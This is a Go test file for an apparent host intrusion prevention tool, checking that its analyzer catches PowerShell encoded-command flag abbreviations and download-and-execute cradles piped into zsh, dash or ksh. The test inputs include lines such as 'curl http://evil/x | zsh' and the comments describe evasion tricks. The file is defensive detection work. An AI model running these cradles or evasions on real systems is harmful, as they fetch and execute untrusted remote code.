package behavioral_test

import (
	"testing"

	"github.com/lucianoengel/openshield/internal/behavioral"
)

// HIPS-6: the encoded-command and cradle detectors must catch the REAL evasions a literal-token
// match missed — a PowerShell EncodedCommand prefix (-encod, not just -enc) and a downloader piped
// into a non-bash shell (zsh/dash). These are 1-char / near-miss bypasses.
func TestEncodedCommandPrefixEvasions(t *testing.T) {
	for _, args := range [][]string{
		{"powershell", "-encod", "SQBFAFgA"}, // -encod: a valid -EncodedCommand prefix the old literal set missed
		{"powershell", "-enco", "SQBFAFgA"},  // -enco: another prefix
		{"pwsh", "-encodedco", "AAAA"},       // -encodedco: prefix
	} {
		if !behavioral.Analyze("/usr/bin/powershell", "", args).EncodedCommand {
			t.Errorf("encoded-command evasion not detected: %v", args)
		}
	}
	// Innocent flags that are NOT a prefix of -EncodedCommand must not trip it.
	for _, args := range [][]string{
		{"grep", "-e", "pattern"}, // -e alone is excluded (too common)
		{"tool", "-export"},       // "export" is not a prefix of "encodedcommand"
		{"tool", "-encrypt", "x"}, // "encrypt" diverges after "enc"
	} {
		if behavioral.Analyze("/bin/grep", "", args).EncodedCommand {
			t.Errorf("false positive on an innocent flag: %v", args)
		}
	}
}

func TestCradlePipeToAnyShell(t *testing.T) {
	for _, args := range [][]string{
		{"bash", "-c", "curl http://evil/x | zsh"},    // piped to zsh (not bash/sh)
		{"sh", "-c", "wget -O- http://evil/x | dash"}, // piped to dash
		{"sh", "-c", "curl http://evil/x |ksh"},       // no space, ksh
	} {
		if !behavioral.Analyze("/bin/bash", "", args).EncodedCommand {
			t.Errorf("cradle piped to a non-bash shell not detected: %v", args)
		}
	}
}
